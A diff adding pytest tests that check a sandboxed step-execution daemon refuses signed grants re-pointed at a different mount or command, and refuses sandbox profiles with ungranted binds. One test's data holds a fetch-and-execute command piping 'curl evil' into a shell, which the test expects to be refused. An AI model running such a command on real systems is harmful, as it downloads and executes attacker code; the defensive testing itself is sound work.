@@ -184,6 +184,68 @@ def test_grant_for_one_run_does_not_authorize_another():
     assert stub.calls == []                                        # the laundered command NEVER ran
 
 
+def test_grant_pinned_workspace_and_argv_bind_the_request():
+    """A grant that PINS workspace + argv authorizes ONLY that mount + command. The honest request runs; the
+    SAME grant re-pointed at the whole host as the rw mount (workspace='/') or at a different command
+    (argv=/bin/sh) is refused and the step never runs — the co-located-key hardening for a stolen/relayed grant.
+    Each sub-case uses a fresh grant nonce so the refusals are the binding check, not the replay guard."""
+    isk, ipub = _kp()
+    stub = _Stub()
+    exod = Exod(Ed25519PrivateKey.generate(), grant_issuer_pub=ipub, runner=stub)
+    ws, argv = "/ws-abc", ["bash", "/ws-abc/run.sh", "--step", "1"]
+
+    def g_for(nonce):
+        return mint_grant(isk, run_id="R1", plan_sha="P1", nbf=990, exp=1100, nonce=nonce,
+                          capabilities=["run"], workspace=ws, argv=argv)
+
+    ok_req = dict(run_id="R1", plan_sha="P1", step="1", argv=argv, workspace=ws, nonce="r1", grant=g_for("g1"))
+    assert result_body(exod.run_step(ok_req, now=1000))["status"] == "ok" and len(stub.calls) == 1
+
+    stub.calls.clear()
+    evil_ws = dict(run_id="R1", plan_sha="P1", step="1", argv=argv, workspace="/", nonce="r2", grant=g_for("g2"))
+    assert result_body(exod.run_step(evil_ws, now=1000))["status"] == "refused" and stub.calls == []
+
+    evil_argv = dict(run_id="R1", plan_sha="P1", step="1", argv=["/bin/sh", "-c", "curl evil|sh"],
+                     workspace=ws, nonce="r3", grant=g_for("g3"))
+    assert result_body(exod.run_step(evil_argv, now=1000))["status"] == "refused" and stub.calls == []
+
+
+def test_exod_wires_the_capmanifest_mount_check_onto_the_live_path(monkeypatch):
+    """The (previously call-site-less) over-wide-bind catcher is now on the live path: if the sandbox the limb
+    is about to run does not match its declared capability manifest, exod refuses (mount:...) and never runs."""
+    import hashlib as _h
+    from infra.exec import exod as exod_mod
+    isk, ipub = _kp()
+    stub = _Stub()
+    exod = Exod(Ed25519PrivateKey.generate(), grant_issuer_pub=ipub, runner=stub)
+    monkeypatch.setattr(exod_mod._capmanifest, "verify_materialized",
+                        lambda prof, man: (False, "ungranted_bind"))
+    body = result_body(exod.run_step(_req(isk), now=1000))
+    assert body["status"] == "refused" and stub.calls == []
+    assert body["output_sha"] == _h.sha256(b"mount:ungranted_bind").hexdigest()
+
+
+def test_capmanifest_catches_a_profile_that_diverges_from_the_granted_workspace():
+    """The mount check is INDEPENDENT (manifest derived from the GRANT's workspace + the fixed core ro-tree),
+    NOT tautologically rebuilt from prof — so a profile_factory that renders a DIFFERENT rw mount than the
+    grant authorized (a _profile bug / tamper) fails closed for real, with no monkeypatch."""
+    import hashlib as _h
+
+    from infra.exec.sandbox import core_profile
+    isk, ipub = _kp()
+    stub = _Stub()
+    # a factory that IGNORES the requested workspace and mounts a path the grant never authorized
+    exod = Exod(Ed25519PrivateKey.generate(), grant_issuer_pub=ipub, runner=stub,
+                profile_factory=lambda ws: core_profile("/xyz-not-granted"))
+    g = mint_grant(isk, run_id="R1", plan_sha="P1", nbf=990, exp=1100, nonce="g1",
+                   capabilities=["run"], workspace="/ws", argv=["bash", "/ws/run.sh", "--step", "1"])
+    req = dict(run_id="R1", plan_sha="P1", step="1", argv=["bash", "/ws/run.sh", "--step", "1"],
+               workspace="/ws", nonce="r1", grant=g)
+    body = result_body(exod.run_step(req, now=1000))
+    assert body["status"] == "refused" and stub.calls == []                       # the divergent mount is caught
+    assert body["output_sha"] == _h.sha256(b"mount:ungranted_bind").hexdigest()   # /xyz is an ungranted rw bind
+
+
 def test_grant_must_carry_the_run_capability():
     isk, ipub = _kp()
     stub = _Stub()
